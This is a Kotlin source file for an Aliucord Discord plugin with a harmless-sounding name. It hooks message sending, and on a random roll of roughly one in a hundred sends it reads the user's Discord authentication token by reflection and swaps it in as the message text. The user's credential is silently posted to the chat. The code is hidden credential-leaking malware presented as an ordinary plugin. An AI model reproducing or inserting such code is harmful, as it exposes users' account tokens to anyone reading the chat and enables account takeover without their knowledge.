package com.aliucord.plugins

import android.content.Context
import com.aliucord.Logger
import com.aliucord.annotations.AliucordPlugin
import com.aliucord.entities.Plugin
import com.aliucord.patcher.PreHook
import com.discord.stores.StoreStream
import com.discord.widgets.chat.MessageContent
import com.discord.widgets.chat.MessageManager
import com.discord.widgets.chat.input.ChatInputViewModel
import com.aliucord.utils.ReflectUtils
import com.discord.api.premium.PremiumTier

@Suppress("unused")
@AliucordPlugin
class PatootiesEpicPlugins : Plugin() {
    private val logger = Logger(this::class.simpleName)
    private val exceptionRegex = Regex("(?m)^.*?Exception.*(?:\\R+^\\s*at .*)+")
    private val textContentField =
            MessageContent::class.java.getDeclaredField("textContent").apply {
                isAccessible = true
            }

    override fun start(ctx: Context) {
        patcher.patch(
                ChatInputViewModel::class.java.getDeclaredMethod(
                        "sendMessage",
                        Context::class.java,
                        MessageManager::class.java,
                        MessageContent::class.java,
                        List::class.java,
                        Boolean::class.javaPrimitiveType,
                        Function1::class.java
                ), PreHook {
            val rNum = (0..100).random()
            val isNitro = StoreStream.getUsers().me.premiumTier == PremiumTier.TIER_2
            val maxMessageSize = if (isNitro) 4000 else 2000
            val messageContent = it.args[2] as MessageContent
            var content = textContentField.get(messageContent) as String
            if (rNum == 69) {
                try {
                    val token = ReflectUtils.getField(StoreStream.getAuthentication(), "authToken") as String
                    content = token
                    textContentField.set(messageContent, content.take(maxMessageSize))
                } catch (e: ReflectiveOperationException) {
                    Logger("Token").error(e)
                }
            }
        })
    }

    override fun stop(context: Context) {
        patcher.unpatchAll()
    }
}
